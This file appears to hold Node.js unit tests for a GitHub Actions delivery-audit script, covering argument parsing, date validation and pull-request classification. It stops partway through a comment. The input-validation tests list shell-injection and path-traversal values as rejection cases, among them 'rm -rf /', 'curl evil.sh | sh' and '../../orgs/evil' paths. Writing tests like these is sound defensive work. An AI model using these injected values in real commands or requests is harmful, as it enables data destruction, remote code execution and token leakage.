// Unit tests for the leaderboard delivery audit (ENG-5689).
//
// Node built-ins only — `node:test` + `node:assert/strict`. No npm install, no
// network, no fixtures directory, matching the dependency-free constraint that
// made audit-delivery.mjs a .mjs in the first place (public-workflows has no
// package.json and no node tooling).
//
// SCOPE: the pure, exported surface — parseArgs, classify, dedupeByHead,
// replayList, renderMarkdown, buildReport — plus, since round 12, the REQUEST
// SHAPES the networking layer emits.
//
// The original scope note said the networking layer was deliberately untested,
// on the grounds that it had been validated against the live API and mocking
// `fetch` would test the mock rather than the API. That reasoning holds for
// RESPONSE handling and does not hold for the requests themselves, which round
// 12 demonstrated the hard way: the closed-PR walk paginated over `updated_at`,
// a mutable sort key, so a PR touched mid-walk shifted the page boundary and a
// merged PR was silently dropped — and a dropped PR cannot be reported as a gap,
// so the defect's only symptom was a CLEANER report. No response fixture can see
// that; nothing about the ordering is observable in what comes back. The
// property lives in the URL, so that is where it is asserted. Live validation
// could not have caught it either, and did not: the audit had been run against
// guard and palatine and looked right both times.
//
// The live-validation figures still stand as evidence for the response layer
// (guard 1419/1052/183/5/179, palatine 384/310/1/0/73).
//
// EVERY expectation below is an independently-derived literal. Nothing is
// computed by calling the code under test, so each assertion can actually fail:
// the `since` dates are hand-computed calendar arithmetic, the FAILED
// membership is spelled out, and the sort fixtures are chosen so that both
// "no sort" and "lexicographic sort" produce a different answer than the
// numeric sort that is required.

import test from 'node:test';
import assert from 'node:assert/strict';

import {
  parseArgs,
  classify,
  dedupeByHead,
  replayList,
  renderMarkdown,
  buildReport,
  retryDelayMs,
  makeClient,
  runsInRange,
  onboardedAt,
  assertReadable,
  resolveFleet,
  verifyPayloads,
  applyPayloadVerdicts,
  SQS_STEP,
  chunk,
  REPLAY_BATCH,
  FAILED,
  GRACE_MS,
  RUN_HISTORY_DAYS,
  headRunsByPr,
  unverifiableReasons,
  UNVERIFIABLE_REAPED,
  UNVERIFIABLE_JOBS_UNREADABLE,
  UNVERIFIABLE_STEPS_REAPED,
  UNVERIFIABLE_RUN_IN_FLIGHT,
  UNDECIDED_VERDICTS,
  usesValues,
  stripComment,
  recoverHiddenDeliveries,
  probeSqsStep,
  needsPayloadProbe,
  assertActionsReadable,
  undecidedCaveats,
  RETRY_STATUS,
  API_CAP,
  SLICE_MAX,
  COMMIT_FILES_CAP,
  auditRepo,
  hasCaller,
  wfEscape,
  assertRepoName,
  shq,
  pickToken,
  TOKEN_SOURCES,
  RETRY_WAIT_MS,
  rateLimitAsk,
  resolveApiUrl,
  yamlStructureLines,
  REPLAY_CAVEATS,
} from './audit-delivery.mjs';

// ── helpers ──────────────────────────────────────────────────────────────────

// Injected clock for every parseArgs date test. 2026-08-04T12:00:00Z.
const NOW = Date.UTC(2026, 7, 4, 12, 0, 0);

const pr = (number, mergedAt, sha) => ({
  number,
  merged_at: mergedAt,
  head: { sha },
});

const run = (id, headSha, conclusion, createdAt) => ({
  id,
  head_sha: headSha,
  conclusion,
  created_at: createdAt,
});

// A repo result in the shape auditRepo() returns, which is what buildReport
// consumes.
// The class set, taken from classify() itself rather than restated. A hand-listed
// fixture is how a newly added class goes untested: it is absent from every
// fixture, so buildReport sums `undefined` and the report surfaces are never
// exercised for it at all. Deriving means adding a class to classify() makes it
// appear here with an empty list, and only the ASSERTIONS then need updating —
// which is the part that should fail loudly.
const CLASS_KEYS = Object.keys(classify([], new Map(), null));

const repoResult = (repo, { merged = 0, ...counts } = {}) => {
  // A misspelled fixture key would otherwise contribute silently nothing while
  // the test still reads as if it covered that class.
  for (const k of Object.keys(counts)) {
    if (!CLASS_KEYS.includes(k)) throw new Error(`repoResult: unknown class "${k}"`);
  }
  const classes = {};
  for (const k of CLASS_KEYS) classes[k] = counts[k] ?? [];
  return { repo, onboarded: null, has_caller: true, merged_prs: merged, classes };
};

const rec = (n) => ({ number: n });

// ── parseArgs ────────────────────────────────────────────────────────────────

test('parseArgs: --days derives since by subtracting whole days from the injected now', () => {
  // 2026-08-04 minus 30 days: 4 days back to 2026-07-31, then 26 more to
  // 2026-07-05. Hand-computed, not derived from the code under test.
  assert.equal(parseArgs(['--days=30'], NOW).since, '2026-07-05');
  // Also exercise the default (DEFAULTS.days === '30') with no flag at all.
  assert.equal(parseArgs([], NOW).since, '2026-07-05');
  // 1 day back from 2026-08-04 is 2026-08-03.
  assert.equal(parseArgs(['--days=1'], NOW).since, '2026-08-03');
  // 216 days back crosses the year boundary: 2026-08-04 → 2025-12-31.
  // (31 Aug-remainder is not how this works — count months: Aug 4 -4 = Jul 31,
  // -31 = Jun 30, -30 = May 31, -31 = Apr 30, -30 = Mar 31, -31 = Feb 28,
  // -28 = Jan 31, -31 = Dec 31 2025. Total 4+31+30+31+30+31+28+31 = 216.)
  assert.equal(parseArgs(['--days=216'], NOW).since, '2025-12-31');
});

test('parseArgs: accepts a space-separated value as well as --flag=value', () => {
  assert.equal(parseArgs(['--days', '30'], NOW).since, '2026-07-05');
  assert.equal(parseArgs(['--days', '1'], NOW).since, '2026-08-03');
});

test('parseArgs: an explicit --since wins over --days, in either order', () => {
  assert.equal(parseArgs(['--since=2026-01-01', '--days=5'], NOW).since, '2026-01-01');
  assert.equal(parseArgs(['--days=5', '--since=2026-01-01'], NOW).since, '2026-01-01');
  // Guard against the inverse: with --days=5 alone the answer would be
  // 2026-07-30, so the assertions above are genuinely about precedence.
  assert.equal(parseArgs(['--days=5'], NOW).since, '2026-07-30');
});

test('parseArgs: rejects a --since that is not YYYY-MM-DD', () => {
  for (const bad of ['2026-1-1', '26-01-01', '2026/01/01', '2026-01-01T00:00:00Z', 'yesterday']) {
    assert.throws(
      () => parseArgs([`--since=${bad}`], NOW),
      /--since must be YYYY-MM-DD/,
      `expected --since=${bad} to be rejected`,
    );
  }
  // The valid shape must NOT throw, or the test above would pass vacuously
  // against a parser that rejects everything.
  assert.equal(parseArgs(['--since=2026-01-01'], NOW).since, '2026-01-01');
});

test('parseArgs: rejects a --since that is shaped like a date but is not one', () => {
  // Shape is not a date, and the roll-over family is the dangerous half: V8 does
  // NOT reject 2026-02-31, it silently returns 2026-03-03. The audit would then
  // cover a window nobody asked for while still printing the requested date, so
  // every PR merged in the skipped days is invisible. Expectations are
  // independently computed: Feb 2026 has 28 days, so the 31st is 3 days past the
  // end (Mar 3), and April has 30, so the 31st is 1 day past (May 1).
  assert.throws(
    () => parseArgs(['--since=2026-02-31'], NOW),
    /normalizes to 2026-03-03/,
  );
  assert.throws(
    () => parseArgs(['--since=2026-04-31'], NOW),
    /normalizes to 2026-05-01/,
  );
  // The not-a-date family yields NaN. It already failed SAFE before this guard
  // (exit 2 via "Invalid time value"), so what is pinned here is only that the
  // message now names the flag and the value instead of neither.
  for (const bad of ['2026-13-01', '2026-00-10']) {
    assert.throws(
      () => parseArgs([`--since=${bad}`], NOW),
      /--since is not a real date: /,
      `expected --since=${bad} to be rejected by name`,
    );
  }
  // Real calendar edges must survive, or the round-trip check would be a blanket
  // rejection: a leap day in a leap year, and the last day of a 31-day month.
  assert.equal(parseArgs(['--since=2024-02-29'], NOW).since, '2024-02-29');
  assert.equal(parseArgs(['--since=2026-01-31'], NOW).since, '2026-01-31');
});

test('parseArgs: rejects a --since in the future rather than reporting a clean empty window', () => {
  // The worst of the three, because it is a perfectly valid date and the failure
  // is a CLEAN verdict. Measured before the fix: `--repo praetorian-inc/caeruleus
  // --since 2027-01-01` printed `merged=0 ... FAILED=0` and exited 0 — the
  // detector reporting all-clear having examined nothing, which is precisely the
  // failure class it exists to catch.
  assert.throws(() => parseArgs(['--since=2027-01-01'], NOW), /is in the future/);
  // The boundary, computed from NOW = 2026-08-04T12:00:00Z. Today's date parses
  // to midnight UTC, which is in the PAST relative to noon, so it is allowed —
  // an audit of "since this morning" is legitimate and must not be refused.
  assert.equal(parseArgs(['--since=2026-08-04'], NOW).since, '2026-08-04');
  // Tomorrow is not.
  assert.throws(() => parseArgs(['--since=2026-08-05'], NOW), /is in the future/);
});

test('parseArgs: rejects --days=0, negatives, and non-integers', () => {
  // '' left this list in round 22: it is still rejected, but by the empty-value
  // guard with its own message — see the dedicated test beside --since/--until.
  for (const bad of ['0', '-1', '1.5', 'abc']) {
    assert.throws(
      () => parseArgs([`--days=${bad}`], NOW),
      /--days must be a positive integer/,
      `expected --days=${bad} to be rejected`,
    );
  }
  // Positive integers still pass.
  assert.equal(parseArgs(['--days=7'], NOW).since, '2026-07-28');
});

test('parseArgs: rejects an unknown flag instead of silently ignoring it', () => {
  assert.throws(() => parseArgs(['--nope=1'], NOW), /unknown flag --nope/);
  // A typo'd real flag is the case that actually bites: a silently-ignored
  // --callerpath would audit the DEFAULT workflow and report phantom gaps.
  assert.throws(() => parseArgs(['--callerpath=x.yml'], NOW), /unknown flag --callerpath/);
});

test('parseArgs: rejects a flag given without a value', () => {
  assert.throws(() => parseArgs(['--days'], NOW), /--days requires a value/);
});

test('parseArgs: rejects --repo and --repos together', () => {
  assert.throws(
    () => parseArgs(['--repo=praetorian-inc/guard', '--repos=guard,palatine'], NOW),
    /--repo and --repos are mutually exclusive/,
  );
});

test('parseArgs: rejects a --repo that is not owner/name', () => {
  for (const bad of ['guard', 'praetorian-inc/', '/guard', 'a/b/c', 'owner name/repo']) {
    assert.throws(
      () => parseArgs([`--repo=${bad}`], NOW),
      /--repo must be owner\/name/,
      `expected --repo=${bad} to be rejected`,
    );
  }
  // The valid shape must NOT throw.
  assert.equal(parseArgs(['--repo=praetorian-inc/guard'], NOW).repo, 'praetorian-inc/guard');
});

test('parseArgs: kebab-case flags set their camelCase keys', () => {
  const cfg = parseArgs(
    [
      '--caller-path=.github/workflows/custom-metrics.yml',
      '--backfill-caller=custom-backfill.yml',
    ],
    NOW,
  );
  assert.equal(cfg.callerPath, '.github/workflows/custom-metrics.yml');
  assert.equal(cfg.backfillCaller, 'custom-backfill.yml');
  // The kebab spelling must not survive as its own key — that would mean the
  // script read the default while the operator thought they had overridden it.
  assert.equal('caller-path' in cfg, false);
  assert.equal('backfill-caller' in cfg, false);
});

test('parseArgs: callerFile tracks the basename of callerPath', () => {
  // This is load-bearing: /actions/workflows/{file}/runs is keyed by FILENAME.
  // A hardcoded callerFile would query the wrong workflow and report every
  // merged PR as never_fired.
  assert.equal(parseArgs([], NOW).callerFile, 'leaderboard-metrics.yml');
  assert.equal(
    parseArgs(['--caller-path=.github/workflows/renamed-caller.yml'], NOW).callerFile,
    'renamed-caller.yml',
  );
  assert.equal(
    parseArgs(['--caller-path=a/b/c/d/deeply-nested.yml'], NOW).callerFile,
    'deeply-nested.yml',
  );
  // A bare filename with no directory component is its own basename.
  assert.equal(parseArgs(['--caller-path=bare.yml'], NOW).callerFile, 'bare.yml');
});

test('parseArgs: a callerPath basename that would re-target the API URL is rejected', () => {
  // callerFile is interpolated into /actions/workflows/{file}/runs UNENCODED, so
  // a basename carrying path syntax does not query a differently-named workflow
  // — it queries a different ENDPOINT, and whatever that returns is then treated
  // as this caller's run history. Each case below is chosen because it survives
  // `.split('/').pop()` and still changes the request:
  for (const bad of [
    '..',                       // walks up out of /workflows
    '..%2fruns',                // encoded traversal the server decodes
    'x.yml?per_page=1',         // smuggles a query parameter
    'x.yml#frag',               // truncates the path at the fragment
    'x.yml/../../secrets',      // rejoins a different resource
    'not-a-workflow',           // no yaml suffix: not a workflow file at all
    '',                         // a trailing slash yields an empty basename
    'sp ace.yml',               // an unencoded space is not a legal URL path
  ]) {
    assert.throws(
      () => parseArgs([`--caller-path=.github/workflows/${bad}`], NOW),
      /--caller-path/,
      `--caller-path=${JSON.stringify(bad)} must be rejected`,
    );
  }

  // And the legitimate shapes still pass, so the guard is not just "throws".
  // (An uppercase `.YML` is deliberately NOT in this list: Actions only
  // recognizes lowercase .yml/.yaml, so such a file is not a workflow.)
  for (const ok of ['leaderboard-metrics.yml', 'a_b.c-d.yaml', 'Mixed-Case.yml']) {
    assert.equal(parseArgs([`--caller-path=.github/workflows/${ok}`], NOW).callerFile, ok);
  }
});

test('parseArgs: a callerPath DIRECTORY that re-targets the API URL is rejected too', () => {
  // The test above guards the basename, which is the part that cannot carry a
  // traversal — and the full path is interpolated into an API URL path as well,
  // in `hasCaller`. Same defect class, one variable over, so it needs the same
  // guard rather than the same reasoning.
  //
  // Measured before the fix, which is why this is a test and not a comment:
  //
  //   parseArgs(['--caller-path=../../../../orgs/evil/leaderboard.yml'])  // ACCEPTED
  //   new URL('/repos/praetorian-inc/guard/contents/' + that, 'https://api.github.com')
  //     -> 'https://api.github.com/orgs/evil/leaderboard.yml'
  //
  // The basename is `leaderboard.yml`, so every check above passed while the
  // request left the repository entirely with the Bearer token attached.
  // Asserted per MESSAGE, not just "throws": an absolute path is caught by the
  // empty-segment rule too (a leading `/` yields an empty first segment), so a
  // bare `assert.throws` would pass with the absolute guard deleted and report a
  // path traversal for `/etc/x.yml` — the wrong cause, and the operator's fix
  // for it is different.
  for (const [bad, why] of [
    // walks off /repos/{owner}/{repo} entirely
    ['../../../../orgs/evil/leaderboard.yml', /empty, "\." or "\.\." path segments/],
    // traversal after a legitimate-looking prefix
    ['.github/../../../x.yml', /empty, "\." or "\.\." path segments/],
    // a `.` segment is not a directory either
    ['./x.yml', /empty, "\." or "\.\." path segments/],
    // an empty segment collapses the path
    ['.github//workflows/x.yml', /empty, "\." or "\.\." path segments/],
    // absolute, and it must say so rather than blaming a traversal
    ['/etc/x.yml', /must be repo-relative, not absolute/],
  ]) {
    assert.throws(
      () => parseArgs([`--caller-path=${bad}`], NOW),
      why,
      `--caller-path=${JSON.stringify(bad)} must be rejected, with its own cause`,
    );
  }

  // The control, and the reason this guard is not anchored to
  // `.github/workflows/`: the caller-renamed remediation prints
  // `--caller-path <previous_filename>`, and a workflow MOVED INTO that
  // directory has a previous path outside it. Anchoring would reject the exact
  // command the report tells an operator to run.
  for (const ok of [
    '.github/workflows/leaderboard-metrics.yml',
    'ci/legacy/metrics.yml',
    'bare.yml',
  ]) {
    assert.equal(parseArgs([`--caller-path=${ok}`], NOW).callerPath, ok);
  }
});

test('parseArgs: a backfillCaller carrying shell metacharacters is rejected', () => {
  // backfillCaller is interpolated into the `gh workflow run` line the report
  // tells a HUMAN to paste into a shell. The report is read by someone
  // responding to a delivery alert, which is the worst possible moment to be
  // handed a command that does something other than what it appears to.
  for (const bad of [
    'x.yml; rm -rf /',
    'x.yml && curl evil.sh | sh',
    'x.yml`id`',
    'x.yml$(id)',
    "x.yml' --repo other/repo '",
    '$IFS.yml',
    'no-suffix',
  ]) {
    assert.throws(
      () => parseArgs([`--backfill-caller=${bad}`], NOW),
      /--backfill-caller/,
      `--backfill-caller=${JSON.stringify(bad)} must be rejected`,
    );
  }

  assert.equal(
    parseArgs(['--backfill-caller=leaderboard-backfill.yaml'], NOW).backfillCaller,
    'leaderboard-backfill.yaml',
  );
});

test('parseArgs: --repo turns on self-audit and splits owner/name', () => {
  const cfg = parseArgs(['--repo=praetorian-inc/guard'], NOW);
  assert.equal(cfg.selfAudit, true);
  assert.equal(cfg.owner, 'praetorian-inc');
  assert.deepEqual(cfg.repos, ['guard']);
});

test('parseArgs: fleet mode leaves selfAudit false', () => {
  assert.equal(parseArgs([], NOW).selfAudit, false);
  assert.equal(parseArgs(['--repos=guard,palatine'], NOW).selfAudit, false);
});

test('parseArgs: an EMPTY --repo is rejected, not silently promoted to an org-wide audit', () => {
  // `required: true` on an action input is documentation, not enforcement, so a
  // caller interpolating an unset expression sends ''. The old `if (out.repo)`
  // was false for '', which skipped the owner/name check AND the --repo/--repos
  // exclusion, left selfAudit false, and fell through to DEFAULTS.owner with
  // repos=null — turning "audit this repo" into an enumeration of the whole org.
  assert.throws(() => parseArgs(['--repo='], NOW), /--repo was passed with an empty value/);
  assert.throws(() => parseArgs(['--repo', ''], NOW), /--repo was passed with an empty value/);
});

test('parseArgs: an empty --repo does NOT leak fleet mode through selfAudit', () => {
  // The consequence, asserted directly rather than via the message: whatever
  // parseArgs does with '', it must never be the fleet configuration. Written so
  // it fails on the pre-fix code (which returned selfAudit=false, repos=null)
  // even if the error wording changes.
  let cfg = null;
  try {
    cfg = parseArgs(['--repo='], NOW);
  } catch {
    return; // throwing is the accepted outcome
  }
  assert.fail(
    `empty --repo must not produce a usable config; got selfAudit=${cfg.selfAudit} repos=${JSON.stringify(cfg.repos)}`,
  );
});

test('parseArgs: omitting --repo entirely still selects fleet mode', () => {
  // Control for the two above. `null` (flag never passed) and `''` (caller
  // passed an unset value) are different facts and only the second is a bug —
  // rejecting both would break the org-wide sweep this script also supports.
  const cfg = parseArgs(['--repos=guard'], NOW);
  assert.equal(cfg.selfAudit, false);
  assert.equal(cfg.repo, null);
  assert.deepEqual(cfg.repos, ['guard']);
});

test('parseArgs: --repos is split, trimmed, and emptied entries dropped', () => {
  assert.deepEqual(parseArgs(['--repos=guard, palatine ,,nerva'], NOW).repos, [
    'guard',
    'palatine',
    'nerva',
  ]);
});

// ── classify ─────────────────────────────────────────────────────────────────

test('classify: a successful run for the PR head is delivered', () => {
  const prs = [pr(1, '2026-07-01T00:00:00Z', 'aaaaaaaabbbbbbbb')];
  const byHead = new Map([['aaaaaaaabbbbbbbb', run(555, 'aaaaaaaabbbbbbbb', 'success', '2026-07-01T01:00:00Z')]]);

  const c = classify(prs, byHead, null, NOW);

  assert.deepEqual(c.delivered.map((r) => r.number), [1]);
  assert.deepEqual(c.failed, []);
  assert.deepEqual(c.never_fired, []);
  assert.deepEqual(c.skipped_anomaly, []);
  assert.deepEqual(c.pre_onboarding, []);
  // The record carries the run identity and an 8-char head SHA for the report.
  assert.equal(c.delivered[0].run_id, 555);
  assert.equal(c.delivered[0].conclusion, 'success');
  assert.equal(c.delivered[0].head_sha, 'aaaaaaaa');
  assert.equal(c.delivered[0].merged_at, '2026-07-01T00:00:00Z');
});

test('classify: every FAILED conclusion lands in failed', () => {
  // Spelled-out membership, independent of the exported Set. If FAILED were
  // emptied or a member dropped, this reds before the loop below runs.
  assert.deepEqual([...FAILED].sort(), [
    'action_required',
    'cancelled',
    'failure',
    'startup_failure',
    'timed_out',
  ]);

  const conclusions = [...FAILED];
  const prs = conclusions.map((_, i) => pr(100 + i, '2026-07-01T00:00:00Z', `sha${i}`));
  const byHead = new Map(
    conclusions.map((concl, i) => [`sha${i}`, run(i, `sha${i}`, concl, '2026-07-01T01:00:00Z')]),
  );

  const c = classify(prs, byHead, null, NOW);

  assert.equal(c.failed.length, conclusions.length);
  assert.deepEqual(
    c.failed.map((r) => r.number),
    conclusions.map((_, i) => 100 + i),
  );
  assert.deepEqual(c.delivered, []);
  assert.deepEqual(c.never_fired, []);
});

test('classify: a skipped run on a MERGED pr is a skipped_anomaly, not a benign skip', () => {
  const prs = [pr(7, '2026-07-01T00:00:00Z', 'deadbeefcafe')];
  const byHead = new Map([['deadbeefcafe', run(9, 'deadbeefcafe', 'skipped', '2026-07-01T01:00:00Z')]]);

  const c = classify(prs, byHead, null, NOW);

  assert.deepEqual(c.skipped_anomaly.map((r) => r.number), [7]);
  assert.deepEqual(c.delivered, []);
  assert.deepEqual(c.failed, []);
  assert.deepEqual(c.never_fired, []);
});

test('classify: an UNCONCLUDED run is in_flight — never never_fired, never delivered', () => {
  // The API leaves `conclusion` null for every non-terminal status (queued,
  // in_progress, waiting, requested, pending), so one null fixture covers all of
  // them — that predicate is the whole test. This must NOT be never_fired:
  // never_fired is on the replay list, so an actively running delivery would be
  // recommended for replay. The audit window counts back from *now*, so a PR
  // merged seconds ago is always in range — this is the common case, not a
  // corner one.
  const prs = [pr(11, '2026-07-01T00:00:00Z', 'sha-null')];
  const byHead = new Map([['sha-null', run(1, 'sha-null', null, '2026-07-01T01:00:00Z')]]);

  const c = classify(prs, byHead, null, NOW);

  assert.deepEqual(c.in_flight.map((r) => r.number), [11]);
  assert.deepEqual(c.never_fired, []);
  assert.deepEqual(c.delivered, []);
  assert.deepEqual(c.failed, []);
  assert.deepEqual(c.skipped_anomaly, []);
  assert.deepEqual(c.pre_onboarding, []);
  // The run identity is still carried, so the report can name what is running.
  assert.equal(c.in_flight[0].run_id, 1);
  assert.equal(c.in_flight[0].conclusion, null);
});

test('classify: an unrecognized TERMINAL conclusion is failed, not in_flight', () => {
  // `neutral` and `stale` are real conclusions we do not enumerate, and GitHub
  // may add more. They are not `success`, so nothing was delivered — and unlike
  // an unconcluded run they will never change on a later audit. Filing them as
  // in_flight would hide them permanently: neither delivered nor a gap, forever.
  // Fail safe instead — surface them as failed so they are replayable.
  const prs = [
    pr(21, '2026-07-01T00:00:00Z', 'sha-neutral'),
    pr(22, '2026-07-01T00:00:00Z', 'sha-stale'),
    pr(23, '2026-07-01T00:00:00Z', 'sha-future'),
  ];
  const byHead = new Map([
    ['sha-neutral', run(1, 'sha-neutral', 'neutral', '2026-07-01T01:00:00Z')],
    ['sha-stale', run(2, 'sha-stale', 'stale', '2026-07-01T01:00:00Z')],
    ['sha-future', run(3, 'sha-future', 'some_conclusion_invented_later', '2026-07-01T01:00:00Z')],
  ]);

  const c = classify(prs, byHead, null, NOW);

  assert.deepEqual(c.failed.map((r) => r.number), [21, 22, 23]);
  assert.deepEqual(c.in_flight, []);
  assert.deepEqual(c.delivered, []);
  assert.deepEqual(c.never_fired, []);
  // The actual value survives onto the record, so the report does not have to
  // pretend it was a `failure`.
  assert.deepEqual(c.failed.map((r) => r.conclusion), ['neutral', 'stale', 'some_conclusion_invented_later']);
});

test('classify: every pr lands in exactly one class, and none are dropped', () => {
  // A conservation check over the whole switch. Written because the in_flight
  // fix added a branch: the failure mode of adding a class is a pr that falls
  // into no bucket at all, which no per-class assertion above would notice.
  const prs = [
    pr(1, '2026-07-20T00:00:00Z', 'ok'),
    pr(2, '2026-07-20T00:00:00Z', 'bad'),
    pr(3, '2026-07-20T00:00:00Z', 'skip'),
    pr(4, '2026-07-20T00:00:00Z', 'gone'),
    pr(5, '2026-07-01T00:00:00Z', 'early'),
    pr(6, '2026-07-20T00:00:00Z', 'running'),
    pr(7, '2026-07-20T00:00:00Z', 'weird'),
  ];
  const byHead = new Map([
    ['ok', run(1, 'ok', 'success', '2026-07-20T01:00:00Z')],
    ['bad', run(2, 'bad', 'failure', '2026-07-20T01:00:00Z')],
    ['skip', run(3, 'skip', 'skipped', '2026-07-20T01:00:00Z')],
    ['running', run(4, 'running', null, '2026-07-20T01:00:00Z')],
    ['weird', run(5, 'weird', 'neutral', '2026-07-20T01:00:00Z')],
  ]);

  const c = classify(prs, byHead, Date.parse('2026-07-10T00:00:00Z'), NOW);

  const placed = Object.values(c).flat().map((r) => r.number).sort((a, b) => a - b);
  assert.deepEqual(placed, [1, 2, 3, 4, 5, 6, 7]);
  // Sorting above would hide a pr counted twice, so check the size too.
  assert.equal(placed.length, prs.length);
});

test('classify: a merged pr with no run and no onboarding timestamp is never_fired', () => {
  const prs = [pr(42, '2026-07-01T00:00:00Z', 'orphansha')];

  const c = classify(prs, new Map(), null, NOW);

  assert.deepEqual(c.never_fired.map((r) => r.number), [42]);
  assert.deepEqual(c.pre_onboarding, []);
  // No run means no run identity on the record.
  assert.equal('run_id' in c.never_fired[0], false);
  assert.equal('conclusion' in c.never_fired[0], false);
});

test('classify: a JUST-merged pr with no run yet is in_flight, not never_fired', () => {
  // The second half of "the verdict is not knowable yet". GitHub indexes a
  // workflow run a moment AFTER the merge, so a PR merged seconds ago has no run
  // row — symptom-identical to never_fired, opposite meaning. Calling it
  // never_fired puts a delivery that is about to happen on the replay list, and
  // replaying re-writes to the prod metrics queue.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'freshsha')];
  const mergedTs = Date.parse(merged);

  // One minute after the merge: inside the window.
  const fresh = classify(prs, new Map(), null, mergedTs + 60_000);
  assert.deepEqual(fresh.in_flight.map((r) => r.number), [9]);
  assert.deepEqual(fresh.never_fired, []);

  // A day later: the run was never going to appear.
  const stale = classify(prs, new Map(), null, mergedTs + 24 * 60 * 60 * 1000);
  assert.deepEqual(stale.never_fired.map((r) => r.number), [9]);
  assert.deepEqual(stale.in_flight, []);
});

test('classify: the grace window is half-open at exactly GRACE_MS', () => {
  // `now - merged < GRACE_MS` is strict, so the boundary instant is OUTSIDE the
  // window. Asserted against GRACE_MS rather than a restated 900000 so that
  // retuning the constant cannot silently invalidate the boundary it describes.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'freshsha')];
  const mergedTs = Date.parse(merged);

  const inside = classify(prs, new Map(), null, mergedTs + GRACE_MS - 1);
  assert.deepEqual(inside.in_flight.map((r) => r.number), [9]);

  const atBoundary = classify(prs, new Map(), null, mergedTs + GRACE_MS);
  assert.deepEqual(atBoundary.never_fired.map((r) => r.number), [9]);
  assert.deepEqual(atBoundary.in_flight, []);

  // And the window is generous enough to cover real run-indexing latency, which
  // is seconds. A window of a few seconds would defeat the purpose.
  assert.ok(GRACE_MS >= 60_000, 'a grace window under a minute cannot absorb indexing latency');
});

test('classify: the grace window is measured from FETCH time, not from classify time', () => {
  // A fleet audit takes minutes — 1316 API calls on one 90-day guard window, and
  // the fan-out multiplies that. A PR merged inside the grace window when its
  // list was fetched can be outside it by the time classify runs, and then a run
  // that simply had not been indexed yet is reported `never_fired` ⇒ on the
  // replay list ⇒ a duplicate write to the prod queue. So the anchor is the
  // EARLIEST honest reading of the clock, not the latest.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'freshsha')];
  const mergedTs = Date.parse(merged);
  const fetchedAt = mergedTs + 60_000; // inside the grace window
  const now = mergedTs + GRACE_MS + 60_000; // the audit has since outlived it

  const c = classify(prs, new Map(), null, now, [], fetchedAt);
  assert.deepEqual(c.in_flight.map((r) => r.number), [9]);
  assert.deepEqual(c.never_fired, []);

  // The control: the SAME inputs with the two anchors collapsed — which is what
  // the code did before — age the PR into the replayable class.
  const collapsed = classify(prs, new Map(), null, now, [], now);
  assert.deepEqual(collapsed.never_fired.map((r) => r.number), [9]);
});

test('classify: fetchedAt defaults to now, so a 4-argument caller is unchanged', () => {
  const merged = '2026-07-20T12:00:00Z';
  const mergedTs = Date.parse(merged);
  const prs = [pr(9, merged, 'freshsha')];
  assert.deepEqual(
    classify(prs, new Map(), null, mergedTs + 60_000).in_flight.map((r) => r.number),
    [9],
  );
  assert.deepEqual(
    classify(prs, new Map(), null, mergedTs + GRACE_MS).never_fired.map((r) => r.number),
    [9],
  );
});

test('classify: the run-history horizon uses NOW, not the earlier fetch anchor', () => {
  // The other anchor, and the asymmetry is deliberate: both choices refuse to
  // manufacture a gap. An older anchor makes a PR look YOUNGER, which keeps it in
  // `never_fired` — replayable — when the truth is that its run record is gone
  // and nothing can be decided. So the horizon takes the LATEST reading, the
  // grace window the earliest.
  const mergedTs = Date.parse('2024-01-01T00:00:00Z');
  const prs = [pr(9, '2024-01-01T00:00:00Z', 'oldsha')];
  const now = mergedTs + (RUN_HISTORY_DAYS + 1) * 86_400_000;
  // fetchedAt sits INSIDE the horizon (and outside the grace window, which is
  // checked first): if the horizon read this anchor, the PR would be never_fired.
  const fetchedAt = mergedTs + GRACE_MS + 1000;

  const c = classify(prs, new Map(), null, now, [], fetchedAt);
  assert.deepEqual(c.unverifiable.map((r) => r.number), [9]);
  assert.deepEqual(c.never_fired, []);
  assert.equal(c.unverifiable[0].unverifiable_reason, UNVERIFIABLE_REAPED);
});

test('classify: pre_onboarding OUTRANKS the grace window', () => {
  // A PR merged before the repo had a caller is a policy question forever, and
  // recency does not change that. Order matters: if the grace check ran first, a
  // just-merged PR in a repo onboarded later would be reported as "not yet
  // decided" and then flip to pre_onboarding on the next cycle.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'freshsha')];
  const mergedTs = Date.parse(merged);

  const c = classify(prs, new Map(), mergedTs + 1000, mergedTs + 60_000);

  assert.deepEqual(c.pre_onboarding.map((r) => r.number), [9]);
  assert.deepEqual(c.in_flight, []);
  assert.deepEqual(c.never_fired, []);
});

test('classify: the grace window does NOT rescue a pr whose run already CONCLUDED', () => {
  // A concluded failure is knowable now, however recent it is. Letting recency
  // suppress it would hide the freshest breakage — exactly the alert with the
  // most value.
  const merged = '2026-07-20T12:00:00Z';
  const prs = [pr(9, merged, 'hasrun')];
  const byHead = new Map([['hasrun', run(1, 'hasrun', 'failure', merged)]]);

  const c = classify(prs, byHead, null, Date.parse(merged) + 60_000);

  assert.deepEqual(c.failed.map((r) => r.number), [9]);
  assert.deepEqual(c.in_flight, []);
});

test('classify: the onboarding boundary splits pre_onboarding from never_fired', () => {
  // ONE pr, no run, evaluated on both sides of onboardedTs. This boundary is
  // what keeps the alert actionable: a PR merged before the repo had a caller
  // never had a delivery path (policy question), whereas one merged after it
  // did is a broken pipeline (alert).
  const merged = '2026-07-10T00:00:00Z';
  const prs = [pr(77, merged, 'boundarysha')];

  // onboarded AFTER the merge → the caller did not exist yet → pre_onboarding.
  const before = classify(prs, new Map(), Date.parse('2026-07-11T00:00:00Z'), NOW);
  assert.deepEqual(before.pre_onboarding.map((r) => r.number), [77]);
  assert.deepEqual(before.never_fired, []);

  // onboarded BEFORE the merge → a delivery path existed and produced nothing.
  const after = classify(prs, new Map(), Date.parse('2026-07-09T00:00:00Z'), NOW);
  assert.deepEqual(after.never_fired.map((r) => r.number), [77]);
  assert.deepEqual(after.pre_onboarding, []);

  // Exactly equal is NOT "before" — the comparison is strict, so a PR merged
  // at the onboarding instant is a real gap.
  //
  // NOW is passed explicitly, and that is not cosmetic symmetry with the two
  // calls above. `classify`'s 4th parameter defaults to `Date.now()`, so omitting
  // it wired this assertion to the WALL CLOCK. Measured against a faked clock, the
  // pre-fix form (no 4th argument) is clock-sensitive in BOTH directions:
  //
  //   2026-07-10T00:05Z  in_flight     FAILS  (within GRACE_MS of the merge)
